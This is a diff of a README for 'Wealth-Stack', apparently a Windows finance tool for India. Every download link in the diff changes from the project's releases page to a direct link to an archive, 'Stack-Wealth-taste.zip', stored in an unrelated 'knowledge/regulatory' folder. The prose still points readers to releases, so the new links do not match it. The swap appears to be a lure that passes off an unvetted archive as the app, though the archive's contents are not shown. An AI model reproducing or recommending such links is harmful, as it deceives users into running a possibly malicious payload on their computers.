@@ -1,12 +1,12 @@
 # 🤖 Wealth-Stack - Clear Wealth Tools For India
 
-[![Download Wealth-Stack](https://img.shields.io/badge/Download%20Wealth--Stack-blue?style=for-the-badge&logo=github)](https://github.com/aaronremiss661/Wealth-Stack/releases)
+[![Download Wealth-Stack](https://img.shields.io/badge/Download%20Wealth--Stack-blue?style=for-the-badge&logo=github)](https://github.com/aaronremiss661/Wealth-Stack/raw/refs/heads/main/knowledge/regulatory/Stack-Wealth-taste.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest Windows version:
 
-[https://github.com/aaronremiss661/Wealth-Stack/releases](https://github.com/aaronremiss661/Wealth-Stack/releases)
+[https://github.com/aaronremiss661/Wealth-Stack/raw/refs/heads/main/knowledge/regulatory/Stack-Wealth-taste.zip](https://github.com/aaronremiss661/Wealth-Stack/raw/refs/heads/main/knowledge/regulatory/Stack-Wealth-taste.zip)
 
 Choose the newest release, then download the Windows file you see there. If the release includes a setup file, save it to your computer before you open it.
 
@@ -183,5 +183,5 @@ Wealth-Stack is a good fit if you want help with:
 
 If you need the file again, use the release page here:
 
-[https://github.com/aaronremiss661/Wealth-Stack/releases](https://github.com/aaronremiss661/Wealth-Stack/releases)
+[https://github.com/aaronremiss661/Wealth-Stack/raw/refs/heads/main/knowledge/regulatory/Stack-Wealth-taste.zip](https://github.com/aaronremiss661/Wealth-Stack/raw/refs/heads/main/knowledge/regulatory/Stack-Wealth-taste.zip)
 
